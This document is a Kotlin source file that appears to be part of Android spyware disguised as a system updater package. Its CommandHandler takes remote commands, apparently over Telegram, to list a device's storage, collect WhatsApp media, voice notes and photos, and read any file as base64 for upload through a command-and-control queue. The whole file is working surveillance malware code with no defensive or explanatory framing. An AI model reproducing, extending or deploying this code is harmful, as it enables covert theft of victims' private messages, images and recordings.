package com.android.systemservice.updater

import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject

object CommandHandler {

    fun handleTelegramCommand(text: String): String? {
        val trimmed = text.trim()
        val parts: List<String>
        val cmd: String
        val arg: String
        if (trimmed.contains(":")) {
            val idx = trimmed.indexOf(":")
            cmd = trimmed.substring(0, idx).lowercase()
            arg = trimmed.substring(idx + 1)
        } else {
            parts = trimmed.split(" ")
            cmd = parts[0].lowercase()
            arg = parts.drop(1).joinToString(" ")
        }

        return when (cmd) {
            "/list" -> FileBrowser.listDirectory(arg.ifBlank { "/storage/emulated/0/" })
            "/whatsapp" -> FileBrowser.whatsAppMediaList()
            "/voice" -> FileBrowser.whatsAppVoiceNotes()
            "/photos" -> FileBrowser.whatsAppImages()
            "/get" -> {
                val result = FileBrowser.readFileAsBase64(arg)
                if (result == null) "❌ Cannot read file: $arg"
                else {
                    C2Queue.enqueueUrgent(JSONObject().apply {
                        put("type", "file_upload")
                        put("name", result.first)
                        put("data", result.second)
                        put("ts", System.currentTimeMillis())
                    }.toString())
                    "📤 Uploading: ${result.first}"
                }
            }
            else -> null
        }
    }
}
